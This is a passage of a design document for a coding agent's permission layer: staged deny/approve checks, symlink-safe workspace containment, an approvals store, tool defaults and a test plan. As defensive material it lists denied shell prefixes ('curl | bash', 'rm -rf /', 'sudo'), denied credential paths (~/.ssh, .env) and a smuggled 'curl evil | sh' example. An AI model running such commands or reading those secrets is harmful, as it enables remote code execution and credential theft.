### §3c. The seven-stage `PermissionChecker` — `tools/permission.go`

**Fail-secure ordering** (corrects 7.md, whose order let an approval bypass deny).
The two non-bypassable *safety-deny* gates run **first**; no approval stage can
override them. Stages run top-to-bottom; first definitive effect wins:

```
Stage 1  ContainmentCheck   — containedPath; deny if the path escapes the workspace        ┐ non-bypassable
Stage 2  HardDenyRules      — deny if matches denied read/write globs / bash prefixes; MaxReadBytes ┘ safety denies
Stage 3  EffectChecker      — optional per-call override from the tool (e.g. future ShellSession send)
Stage 4  HardApproveRules   — operator always-allow ("*" = all)
Stage 5  PersistedApprovals — ~/.urvi/workspaces/<hash>/ then ~/.urvi/approvals.json; deny beats allow
Stage 6  SessionPolicies    — in-memory ToolPolicy list; extended at runtime by 's'/'w'
Stage 7  DefaultEffect      — EffectAsk
```

Containment and hard-deny precede `EffectChecker`/`HardApprove`/persisted/session,
so a tool's per-call auto-approve, an operator `"*"` allow, or a saved approval can
only ever upgrade `Ask → AutoApprove` — never bypass a denied path, a denied
command prefix, or the workspace boundary (CLAUDE.md: *fail secure*). A future
`ShellSession` send auto-approved by `EffectChecker` is still subject to the
denied-bash-prefix gate, which is the intended behaviour.

**Persisted approvals never live in the repo (trust boundary).** Workspace-scope
grants are written to `~/.urvi/workspaces/<hash>/approvals.json`, where `<hash>` is a
`sha256` of the **resolved** workspace root path — *not* to `<ws>/.urvi/`. A cloned
or hostile repo therefore cannot ship an `approvals.json` that silently auto-approves
`Bash` (the supply-chain attack the in-repo location of 7.md enabled). Within Stage 5,
records are not first-match-wins across allow/deny: **a matching `deny` always wins
over a matching `allow`** (scan all records from both files; any `deny` → deny), so a
user-level `~/.urvi/approvals.json` deny can't be undercut by a workspace allow.

**Policy-store filesystem hardening.** The store is security-sensitive, so `Grant`
and the loader treat it strictly: directories (`~/.urvi`, `~/.urvi/workspaces/<hash>`)
are created `0700`, approval files `0600`; the temp file is opened
`O_CREATE|O_EXCL|O_WRONLY|O_NOFOLLOW` at `0600` before the atomic `Rename`; and a
**symlinked path component anywhere in the policy path is rejected** (don't follow a
symlinked `~/.urvi` or `workspaces/<hash>`). The loader rejects a file that is not a
regular file or is group/world-writable. (This is the store's *own* hardening, distinct
from the workspace `containedPath` rules.)

**Containment must resolve symlinks**, not just `Clean`+prefix — a path *inside*
the workspace can be a symlink to `/etc`, `~/.ssh`, or another repo. `containedPath`
(used by `ReadFile`, `WriteFile`, `EditFile`, `Glob`, `Grep`, and any tool with a
path/workdir arg) therefore:

1. resolves the workspace root once via `filepath.EvalSymlinks`;
2. `filepath.Clean`+`Join`s the input under the resolved root;
3. for an **existing** target, `EvalSymlinks` the full path; for a **not-yet-existing**
   write target, `EvalSymlinks` the deepest existing parent;
4. verifies the resolved path is still under the root with `filepath.Rel` (reject
   a `..` escape);
5. opens with `O_RDONLY|O_NOFOLLOW` (reads) so a final-component symlink fails to
   open rather than being followed — closing the resolve→open TOCTOU window.

This matches the attachment-read hardening already in the tree
(`docs/plans/2026-06-13-tui-design.md`, *Block building*: `O_NOFOLLOW` + fd stat +
`LimitReader`). `ReadFile` additionally caps the read via
`LimitReader(MaxReadBytes)` (from its `ReadGuard`).

**Write-side threat model.** `WriteFile`'s `MkdirAll` + temp-write + `Rename` leaves
a residual TOCTOU: a parent directory could be swapped to a symlink between the
containment check and the write. This is **explicitly out of the threat model** —
consistent with the TUI design's stance that this is a *local, single-user tool
acting with the user's own privileges*, so a concurrent attacker with write access
to the live workspace is already past the boundary. As cheap defence-in-depth the
temp file is created with `O_CREATE|O_EXCL|O_WRONLY|O_NOFOLLOW` (no symlinked temp,
no clobber). Full `openat`/dirfd confinement is platform-specific (would need
`golang.org/x/sys`) and disproportionate here; it is noted as a hardening option if
the threat model ever changes (e.g. a shared/multi-tenant workspace).

**`Match` semantics (canonical, to avoid loose matching).**
- **File globs** (`ReadFile`/`WriteFile`/`EditFile`/`Glob`/`Grep`) match against the
  **workspace-relative, cleaned, symlink-resolved** path (the `containedPath`
  output relativised to the root) — never a raw or absolute string — so a pattern is
  stable and cannot be fooled by `..` or an absolute prefix. Matching uses the same
  per-segment `path.Match` matcher as `Glob` (`**` supported).
- **Bash** matches the **exact normalized command** by default (trim + collapse
  internal whitespace) — a `Grant` from the prompt stores that exact string, so the
  grant approves *only* that command, not arbitrary suffixes. A prefix grant is the
  hand-edited `"prefix": true` opt-in only. (Still gated behind hard-deny prefixes;
  see the Bash security note.)
- **Fetch** match grammar is **`<METHOD> <scheme>://<host>[<path-prefix>]`** — host
  alone is too coarse for a method/body-capable tool (a benign `GET` grant must not
  auto-approve later `POST`s to the same host). All three dimensions are matched:
  - **method** — exact (`GET`/`POST`); a grant records the approved method.
  - **scheme** — exact; defaults to `https` (an `http://` grant is explicit).
  - **host** — `strings.ToLower(u.Hostname())` (`Hostname()`, *not* `u.Host`, so the
    **port is excluded**), IDNA-normalized to punycode
    (`golang.org/x/net/idna.Lookup.ToASCII`; non-normalizable host rejected); **exact
    equality or a leading-dot suffix** (`.example.com` matches `api.example.com`),
    **never substring/prefix**, so `example.com` ≠ `example.com.evil.com`.
  - **path-prefix** — matched **only if present** in the record (explicit opt-in);
    absent = any path on that scheme+host+method.
  e.g. `"GET https://.github.com"` approves GETs to any `*.github.com` over https, but
  not a POST and not `http://`.
- **WebSearch** ignores `Match` (a grant is tool-level; the query is not a boundary).

```go
type EffectChecker interface { CheckEffect(argsJSON string) (effect loop.Effect, handled bool) }

type HardApproveRules struct { Tools []string }
type HardDenyRules struct {
    DeniedReadPaths    []string // ~/.ssh/**, **/.env, **/*.pem, **/id_rsa, ~/.urvi/**, … (defaults)
    DeniedWritePaths   []string // same + **/.git/config, **/go.sum, AND **/.urvi/** + ~/.urvi/**
    DeniedBashPrefixes []string // "rm -rf /", "sudo", "curl | bash", "dd if=", … (defaults)
    MaxReadBytes       int64    // default 1 MiB
}
// The policy store is deny-write: **/.urvi/** (any in-repo .urvi) and ~/.urvi/** are
// hard-denied for WriteFile/EditFile so the tool system can never mutate its own
// approvals — only PermissionChecker.Grant writes them. (Containment already blocks
// ~/ from WriteFile; this is defense-in-depth and also covers an in-repo .urvi.)
type ApprovalRecord struct {
    Tool   string `json:"tool"`
    Match  string `json:"match,omitempty"`   // tool-interpreted; empty = all calls of this tool
    Prefix bool   `json:"prefix,omitempty"`  // Bash only: true = prefix match (hand-edited, risky); default exact
    Effect Effect `json:"effect"`
}
// Match is interpreted by the tool's matcher: a path glob (ReadFile/WriteFile/
// EditFile/Glob/Grep), the EXACT normalized command (Bash), or the
// "METHOD scheme://host[path-prefix]" grammar (Fetch, §3c). WebSearch ignores Match.
// **Bash matching is EXACT (normalized) by default** — a Grant from the prompt writes
// the exact normalized command, so a grant of "go test ./..." does NOT also approve
// "go test ./...; curl evil | sh". A prefix rule requires the hand-edited
// `"prefix": true` (a deliberate, risky opt-in). WebSearch ignores Match.
// An empty Match means "all calls of this tool" — discouraged for high-risk tools.
type ApprovalsFile struct { Version int `json:"version"`; Approvals []ApprovalRecord `json:"approvals"` }
// On disk (effect is a string; Bash match is the exact normalized command):
//   { "version": 1, "approvals": [
//       {"tool": "WriteFile", "match": "src/**",      "effect": "allow"},
//       {"tool": "Fetch",     "match": "GET https://.github.com", "effect": "allow"},
//       {"tool": "Bash",      "match": "go test ./...", "effect": "allow"} ] }

type PermissionPolicy struct {
    WorkspaceRoot string
    HardApprove   HardApproveRules
    HardDeny      HardDenyRules
    Policies      []ToolPolicy // extended in place for session-scope grants
}

type PermissionChecker struct { /* mu; policy; wsCache, userCache *hashcache.Cache[ApprovalsFile] */ }
func NewPermissionChecker(policy PermissionPolicy) *PermissionChecker
// satisfies loop.PermissionGate:
//   Check runs the seven stages (under RLock).
//   Grant: ScopeSession appends a ToolPolicy under mu; ScopeWorkspace writes an
//          ApprovalRecord to ~/.urvi/workspaces/<sha256(resolvedRoot)>/approvals.json
//          (atomic tmp+Rename, dir created as needed; never in the repo) so the next
//          Check picks it up via the hashcache. Bash grants are written exact-match.
```

`Grant` derives the `ApprovalRecord`/`ToolPolicy` from `toolName`+`argsJSON` using
the same path/command extraction `Check` uses. `Check` re-reads the approval files
on **every** call (so a `w` grant during one gate is visible to the next call's
`Check` immediately); `hashcache` skips the JSON unmarshal when the file bytes are
unchanged.

**Malformed approvals — `Check` has no error return, so it fails open to `EffectAsk`,
never to `AutoApprove`.** A read or parse failure of an approvals file makes the
**Stage-5 persisted-approvals stage behave as empty** (the file contributes no
grants); evaluation continues to Stage 6/7, landing at `EffectAsk` — the user is
prompted (and can fix the file). A single malformed *record* in an otherwise-valid
file is skipped (it grants nothing); valid records still apply. This is fail-secure
in the right direction: a broken file can never *auto-approve*, but it also doesn't
deny-everything and wedge the agent. The failure is surfaced once as a warning
(log/sink) so the user knows the file is broken. (`hashcache.Load` returns
`(ApprovalsFile, error)`; on error `Check` uses the zero value and warns — it never
propagates the error into the effect.)

### §3d. New helper — `internal/hashcache/`

```go
type Cache[T any] struct { /* mu sync.Mutex; sum [32]byte; val T; ok bool; parse func([]byte)(T,error) */ }
func New[T any](parse func([]byte) (T, error)) *Cache[T]
func (c *Cache[T]) Load(content []byte) (T, error) // sha256(content)-keyed; re-parses only on change
```

Pure stdlib (`crypto/sha256`, `sync`); concurrency-safe. `PermissionChecker` holds
two instances (workspace + user approvals files).

**On `Cache[T any]` and the no-`any` rule.** `[T any]` here is a *type-parameter
constraint* (the unconstrained-type-parameter idiom), **not** the banned dynamic
`any`/`interface{}` value flowing through business logic — which is what CLAUDE.md
prohibits. It matches existing precedent in the tree (`llm.StreamReader[T any]`,
`registry.Registry[T any]`) and the ruling already made in the TUI design doc. The
generic also *required* by the layering: a concrete `ApprovalsCache` here would force
`internal/hashcache` to import `ApprovalsFile` from `tools/` — an import cycle
(`tools/` → `internal/hashcache`). If you prefer maximum simplicity over reuse, the
alternative is a concrete unexported `approvalsCache` living *in* `tools/` (no
separate package); this design keeps the generic `internal/hashcache` as a domain-free
reusable utility, per the approved "build hashcache" decision.

---

## §4 — The 11 tools & the two manifests

### §4a. Tool construction (narrow deps — supersedes 7.md Rule 2)

Each tool is constructed with **only the narrow deps its family needs** (§3b table),
not a shared god-struct — per CLAUDE.md least privilege / interface segregation. The
loop-side `ToolSet` (`Permission`/`Registry`/`Middlewares`) is the runner's, never
handed to a tool. Errors → tool-result strings; secrets never logged (and never put
in observability events — §2d); `crypto/rand` IDs (`internal/uuid`).

### §4b. The tools (`ToolResult.Content` is `[]content.Block`)

| Tool | Args | Behaviour | Default |
|---|---|---|---|
| `ReadFile` | path, start/end line | `containedPath` + `DeniedReadPaths` + `MaxReadBytes`; line-numbered text; truncation notice | AutoApprove |
| `WriteFile` | path, content | `containedPath` + `DeniedWritePaths`; `MkdirAll`; atomic write — temp via `O_CREATE\|O_EXCL\|O_WRONLY\|O_NOFOLLOW` then `Rename` (write-TOCTOU threat model in §3c) | Ask (`FileWriteRequest`) |
| `EditFile` | path, old/new, replace_all | str-replace; 0→error, 2+ & !replace_all→ambiguous, else replace; diff preview | Ask (`FileWriteRequest`) |
| `Bash` | command, workdir, timeout(≤120s) | `exec.CommandContext(ctx, "sh", "-c", command)`; combined output; 32 KiB cap; advisory `DeniedBashPrefixes` (see security note) | Ask (`BashRequest`) |
| `Glob` | pattern, root | `containedPath`; **`**` via stdlib `WalkDir` + per-segment `path.Match`**; **`ReadGuard` excludes `DeniedReadPaths` from results** (else auto-approved glob leaks `.env`/`id_rsa` names); ≤500 results | AutoApprove |
| `Grep` | pattern, path, recursive, ignore_case, context_lines, include_all | `rg` if present (binary, not a Go dep) — **arg-list exec, never a shell string: `exec.Command("rg", "--regexp", pattern, flags…, "--", path)`** so a `-`-leading pattern/path can't become a flag — else `WalkDir`+`regexp`; skip noise dirs; **denied-path enforcement is two-layer** (see note); ≤200 matches | AutoApprove |
| `Fetch` | url, method(GET/POST), headers, body, timeout(≤60s) | `net/http` w/ explicit timeouts + `tls.Config{MinVersion: TLS1.2}`; 64 KiB cap | Ask (`FetchRequest`) |
| `WebSearch` | query, results(≤10) | `SearchProvider` iface; DuckDuckGo HTML scrape via **`golang.org/x/net/html`** | Ask (`WebSearchRequest`) |
| `AskUser` | question, choices | emits `UserInputRequested` via `EmitFromContext`; registers a gate, blocks on its reply (CallID-validated); answer validated against choices | AutoApprove |
| `Todo` | action(create/update/list), … | in-memory `sync.Mutex` map on the tool; `uuid` IDs; session-scoped | AutoApprove |
| `Subagent` | skill, message | **synchronous** child `session.AgentSession` (`Invoke` to completion, returns final text); `Skill` selects a persona via `internal/registry`; **hard max-depth (default 2) carried in `ctx` and incremented per spawn — exceeding returns a tool-result error** (prevents runaway recursion/resource exhaustion even though full depth/budget design is deferred) | AutoApprove |

`Sequential` and `EffectChecker` are defined as extensibility seams but no built-in
implements them yet (ShellSession, deferred, is their first user).

**Bash security model (documented exception to CLAUDE.md's shell rule).** `Bash`
runs a single command **string** via `sh -c` — a deliberate exception to *"never
pass user input to `exec.Command` as a shell string"*, because a coding agent
genuinely needs shell features (pipes, globs, `&&`, redirects) that an argv list
can't express. The exception is explicit, not accidental:

- The **boundary is the permission gate**, not the denylist: `Bash` defaults to
  `Ask`, so a human reads and approves each command before it runs. Auto-approval
  only happens if the operator/user opts in (`HardApprove`, a session/workspace
  grant) — a conscious widening.
- `DeniedBashPrefixes` (e.g. `rm -rf /`, `sudo`, `curl | bash`, `dd if=`) is
  **advisory defense-in-depth, NOT a security boundary** — it is trivially
  bypassable (`/usr/bin/sudo`, `env sudo`, `bash -c …`) and must never be relied on
  as one. It still runs in the non-bypassable hard-deny stage (§3c) to catch
  obvious mistakes, but the design does not claim it confines a hostile command.
- The real hard boundary — OS-level sandboxing (seccomp/landlock/nsjail) — is
  **out of scope** here and is the prerequisite for ever auto-approving `Bash`
  broadly. Until then, `Bash` is gated by human approval.
- This exception must be recorded in CLAUDE.md when `Bash` is implemented.

**Grep denied-path enforcement (two-layer).** `rg` opens files itself during a
recursive search, so it must not be trusted as the security boundary. (1) Translate
`DeniedReadPaths` + noise dirs into `rg --glob '!<pattern>'` exclusions (gitignore-
style, matching our `**/.env` form) so `rg` *skips* (never opens) them — best-effort,
for performance and "not opened". (2) **Authoritatively**, filter every result path
through `ReadGuard.DeniedRead` before emitting, so even a translation gap can never
leak a denied file's path/content to the model. The stdlib `WalkDir`+`regexp`
fallback applies `DeniedRead` directly during traversal. An integration test asserts
a workspace `.env` is neither opened by `rg` (no `--glob` miss) nor present in output.

### §4c. Default-policy table

`ReadFile/Glob/Grep/Todo/AskUser/Subagent → AutoApprove` (within workspace);
`WriteFile/EditFile/Bash/Fetch/WebSearch → Ask`.

### §4d. The two manifests

Each `New(ctx)` self-wires (matching today's `personalassistant.New(ctx)`):
`os.Getwd()` → workspace root → build `PermissionPolicy` (default hard rules) →
`pc := tools.NewPermissionChecker(policy)` → construct the tools it wants **with
their narrow deps** (read tools get `root`+`pc` as the `ReadGuard`; write/exec tools
get `root`; web tools get an
`*http.Client`; `Subagent` gets a child-agent factory + `rootCtx`) → assemble
`loop.ToolSet{Permission: pc, Registry: thoseTools, Middlewares: …}` → read API key
from env → `auto.New(spec)` → seal `loop.Config{Client, Model, Tools: toolSet}` →
`session.NewAgent(rootCtx, cfg)`. The wrapper satisfies `tui.Agent` plus the new
`Approve`/`Deny`/`ProvideAnswer` trio (§5c). The manifest is the only place that
knows the concrete tool set and wires each tool's least-privilege deps.

- **`agents/personal-assistant`** (Kimi K2, text-only) → safe subset:
  `ReadFile, Glob, Grep, Fetch, WebSearch, AskUser, Todo`. No write/exec tools.
  (Easily tuned in the manifest.)
- **`agents/coding`** (new) → all 11 tools; coding system prompt; reuses
  `llm.ChutesKimiK2()` for v1 (strong agentic-coding model, already in the catalog,
  text-only — model swap is a one-line manifest change). Registered as a second
  `tui.Agent` in `cmd/cli`, selected by name arg.

---

## §5 — Loop command/event additions, TUI contract, testing

### §5a. `command/` additions

`ApproveToolCall`, `DenyToolCall`, `ProvideUserInput` — see §2c. Handled by
`listen` as control commands.

### §5b. `event/` additions

```go
type PermissionRequested struct { CallID uuid.UUID; Request tool.PermissionRequest }
type UserInputRequested  struct { CallID uuid.UUID; Question string; Choices []string }
type ToolCallStarted     struct { CallID uuid.UUID; ToolName, Summary string } // Summary redacted/capped, never raw args
type ToolCallCompleted   struct { CallID uuid.UUID; IsError bool }
// each: isEvent()
```

`event` imports `internal/tool` for `PermissionRequest` — no cycle (`tool` imports
only `content`). `ShellSession*` events are deferred with the tool.

**Two audiences, not one — redacted sink projection.** Turn events serve two
consumers: the per-turn `StartTurn.Events` **stream** (the TUI, which *must* see full
fidelity — `Request.Description()` is what it renders) and the `EventSink` path
(observability/audit logs). `PermissionRequested.Request.Description()` can hold a
Bash command, a file-diff preview, or a URL; `UserInputRequested.Question` can hold
user-sensitive text — neither belongs verbatim in a log (CLAUDE.md: *log events, not
secrets*). So the **stream is full-fidelity; the sink path is redacted**. An event
carrying sensitive payload implements an optional projector that the loop applies
**only on the sink path** (the stream is untouched):

```go
// in internal/agent/loop/event/
type Redactable interface { SinkProjection() Event } // loop calls this before enveloping for sinks
```

| Event | Stream (TUI) | Sink projection |
|---|---|---|
| `PermissionRequested` | full `Request` | `{CallID, ToolName}` only (drop `Description`) |
| `UserInputRequested` | full `Question`/`Choices` | `{CallID, len(Choices)}` (drop `Question`) |
| `ToolCallStarted` | redacted `Summary` (already safe) | unchanged |
| `TokenDelta`/`TurnDone` | full content | model-output content; a sink may drop it by config (not a *secret*, but PII-bearing) |

This is a loop sink-path concern; it composes with the identity-doc envelope (the
loop projects the event, then wraps it in the `EventEnvelope`).

### §5c. `session` + `tui.Agent` additions

`AgentSession` gains `Approve(ctx, callID, scope) error`, `Deny(ctx, callID) error`,
`ProvideUserInput(ctx, callID, answer) error` — each sends the command to
`loop.Commands` with a fresh `Header.ID`, **selecting on `ctx.Done()` and the loop's
`Done` channel** so a send never blocks forever if the actor has exited or is busy
(`loop.Commands` is unbuffered). This matches the existing `Interrupt(ctx) (bool,
error)` / `Shutdown(ctx) error` signatures (not the ctx-less form in the first
draft). The TUI's consumer-defined `Agent` interface gains a matching
`Approve(ctx,…) error` / `Deny(ctx,…) error` / `ProvideAnswer(ctx,…) error` trio;
both agent wrappers delegate to the session, and the TUI calls them as bounded
`tea.Cmd`s (like `interruptTurn`).

### §5d. TUI integration — contract only (rendering deferred)

7.md's dropped `client/` view-models reland in `tui/`:

- New events ride the same per-turn stream `readNext` already drains.
- **Prompts are a FIFO queue keyed by `CallID`, not a single slot.** Because
  several `AskUser` gates can be open at once (parallel execution, §2c), the TUI
  holds `pending []prompt` (each tagged with its `CallID`), renders the **head**, and
  every answer/approval is dispatched **with that head's `CallID`**, then popped to
  reveal the next. (Permission gates resolve sequentially so they don't pile up, but
  routing by `CallID` makes the two uniform and collision-free.)
- `PermissionRequested` → enqueue; the head renders an approval box
  (`Request.ToolName()` / `Request.Description()` / keys from `AllowedScopes()` +
  always `[n]`); a single keypress `y/s/w`/`n` dispatches a **bounded `tea.Cmd`**
  calling `agent.Approve(ctx, callID, scope)` / `agent.Deny(ctx, callID)` for the head
  `CallID` (Update loop never blocks on the send), then pops. The queue is cleared on
  any terminal event.
- `UserInputRequested` → enqueue; the head renders as an assistant-style question;
  choices → key list + "other…"; the answer dispatches a bounded `tea.Cmd` calling
  `agent.ProvideAnswer(ctx, callID, text)` for the head `CallID`, then pops.
- `ToolCall{Started,Completed}` → optional tool-call cards; today's TUI ignores
  unknown event types, so this is additive.

The pixel-level work is a follow-up TUI-update doc, since that TUI is mid-flight.

### §5e. Testing (table-driven, `-race`, fuzz for parsers — CLAUDE.md)

- `hashcache` — parse-skip on unchanged bytes, change detection, concurrent `Load`.
- `PermissionChecker` — **fail-secure ordering**: a `HardDeny`-matching path/command
  is denied even when a tool's `EffectChecker`, a `HardApprove "*"`, or a persisted
  approval would auto-approve it. Plus containment escape, hard-deny globs,
  **deny-beats-allow precedence** (any matching `deny` from *either* the workspace or
  user file wins; otherwise any matching `allow` grants), and `Grant` (ScopeSession
  appends in-memory; ScopeWorkspace writes the out-of-repo file and the next `Check`
  sees it).
- `containedPath` — **symlink escape**: a symlink inside the workspace pointing to
  `/etc`/`~/.ssh`/another repo is rejected; `..` escape rejected; `O_NOFOLLOW`
  final-component symlink fails to open. `FuzzContainedPath` over adversarial paths.
- Each tool — happy/boundary/error/edge; `FuzzGlobMatch`; `EditFile` occurrence
  rules; `Bash` exit/timeout/truncation; `Fetch` method + truncation; `WebSearch`
  via a fake `SearchProvider`; `AskUser` answer validation. **`Glob`/`Grep` exclude
  a `DeniedReadPaths` entry** (e.g. a `.env` in the workspace) from results/matches.
- approval matching — `Match` interpreted per tool: path glob (files), **exact
  normalized command** (`Bash`; `"prefix": true` opt-in), **`METHOD scheme://host`**
  (`Fetch`), ignored (`WebSearch`).
- observability — `ToolCallStarted.Summary` is the **redacted** form: `WriteFile`
  carries no content, `Fetch` no headers/body (assert no secret substring leaks).
- least-privilege deps — a web tool's constructor takes no workspace root (compile-
  level: it can't reach the filesystem); `ToolSet` is not passed to any tool.
- `runner` — serial-then-parallel batching (fake `Sequential` tool), N→N+1
  session-grant visibility, `Grant` called only when `Scope != ScopeOnce`,
  middleware ordering, panic→error result, ctx-cancel terminates.
- `runTurn` — `ToolUseChunk` fragment-accumulation by `Index`, tool round-trips,
  tool-result flattened to text in the `ToolMessage` (non-empty on the wire;
  non-text → visible placeholder), `Terminate` completes with `TurnDone`, no-tool-call
  exit; fake `llm.LLM`.
- gate plumbing — **synchronous registration**: an approval delivered immediately
  after the request still lands (the ack ordering guarantees install-before-emit);
  the per-gate channel does not drop the valid approval when a stale/duplicate
  precedes it; **two concurrent `AskUser` gates** in one parallel batch each resolve
  independently via `pendingGates`; `listen` drops a command with no/!matching gate.
- session methods — `Approve/Deny/ProvideUserInput` return an error (don't block)
  when `ctx` is cancelled or the loop has exited.
- `PermissionRequest` types compile in `internal/tool` (sealed marker satisfied);
  `loop` constructs `UnknownRequest` without importing `tools`.
- gate-kind matching — an approve/deny with a colliding `CallID` does **not** satisfy
  an `AskUser` gate (and a provide does not satisfy a permission gate); registration
  and ack both unblock on `ctx` cancellation (no wedge if the actor exits).
- `Match` semantics — `Fetch` host match rejects `example.com.evil.com` for an
  `example.com` grant, accepts `.example.com` subdomains, requires `https`, strips the
  port (`host:443` matches `host`), and normalizes a unicode homograph to punycode;
  file globs match the workspace-relative canonical path, not `..`/absolute strings.
- `Grant` failure — a `ScopeWorkspace` grant whose file write fails still **executes**
  the approved call and emits a warning (not a deny, not a tool-result error).
- tool-result flattening — a tool returning a non-`TextBlock` yields a visible
  `[unsupported …]` placeholder in the `ToolMessage`, never empty/silent.
- `Subagent` depth — a spawn at `ctx` depth ≥ cap returns a tool-result error, no
  child session created.
- `Effect` JSON — round-trips `"allow"/"ask"/"deny"`; an unknown string errors.
- `Grep` `rg` — a pattern like `-x`/`--foo` is passed as a value (`--regexp`/`--`),
  not interpreted as a flag; a workspace `.env` is excluded via `--glob` **and**
  dropped by the `ReadGuard.DeniedRead` output filter (belt-and-suspenders).
- sink redaction — `PermissionRequested`/`UserInputRequested` delivered to a fake
  `EventSink` carry **no** `Description`/`Question` text; the same events on the
  stream carry the full payload.
- malformed approvals — a corrupt/unknown-`effect` approvals file yields `EffectAsk`
  (never `AutoApprove`) and a warning; a bad record is skipped, valid ones still apply.
- TUI prompt queue — two concurrent `UserInputRequested` (distinct `CallID`s) render
  head-first and each answer dispatches with the correct `CallID`.
- approvals trust boundary — an in-repo `<ws>/.urvi/approvals.json` granting `Bash`
  has **no effect** (only `~/.urvi/workspaces/<hash>/` is read); a user-level `deny`
  overrides a workspace `allow`; `Grant` writes under `~/.urvi/workspaces/<hash>/`.
- policy store deny-write — `WriteFile`/`EditFile` to `<ws>/.urvi/approvals.json` (or
  any `**/.urvi/**`) is denied.
- Bash exact match — a grant of `go test ./...` does **not** auto-approve
  `go test ./...; echo x`; a `"prefix": true` record does.
- malformed tool call — folded `Input` of invalid JSON → stored as `{}` + a
  tool-result error for that call; history re-encodes cleanly on the next request.
- runaway guard — a model that emits a tool call every round hits
  `MaxToolIterations`/`MaxToolCallsPerTurn` and ends in `TurnFailed{ToolLimitError}`
  (not an infinite loop); **the whole turn is rolled back to `base`** so `msgs` holds
  no unpaired `tool_use` block (assert the next encode succeeds).
- whole-turn rollback — `TurnFailed`/`TurnInterrupted` mid-agentic-loop truncates all
  of the turn's appended messages (user + every assistant/tool pair), not just the last.
- Fetch match — a `GET https://api.host` grant does **not** approve a `POST` to the
  same host, an `http://` request, or `api.host.evil`.
- policy-store hardening — `Grant` creates dirs `0700`/files `0600`, refuses to follow
  a symlinked `~/.urvi`, and the loader rejects a world-writable approvals file.
- manifests — coding registers 11 tools, PA registers the 7-tool subset,
  `AcceptsImages` false.
- **Integration tests** (`//go:build integration`, `*_integration_test.go`, run with
  `-tags integration` — CLAUDE.md:115, process-boundary code): real-filesystem tests
  for `ReadFile`/`WriteFile`/`EditFile`/`Glob`/`Grep` under a `t.TempDir()` workspace
  (containment, symlink-escape rejection, `O_NOFOLLOW`/`O_EXCL` write, `MaxReadBytes`
  cap, `DeniedReadPaths` exclusion, atomic rename); and `Fetch`/`WebSearch`
  `SearchProvider` against a local `httptest.Server` (timeouts, TLS floor, truncation,
  host-match enforcement).
- (identity-model tests live in the identity doc.)

---

## Out of scope (this iteration)

- **ShellSession** — persistent/async shell; needs a session-wide event path so
  `ShellSessionEnded` reaches the UI between turns. Its own follow-up. (`Sequential`
  + `EffectChecker` seams are in place so it lands with no runner change.)
- **Subagent** beyond the synchronous stub — streaming child events, the full
  depth/token-budget policy (a hard max-depth cap ships now, §4b), skill catalog.
- WebSearch providers beyond DuckDuckGo.
- Command dedup/idempotency **cache** (IDs are the substrate — identity doc).
- Detailed TUI rendering of prompts/cards (contract here; rendering in a TUI-update
  doc).
- Bash OS-level sandboxing, Fetch prompt-injection sanitization, tool-result
  caching, tool versioning (as 7.md).
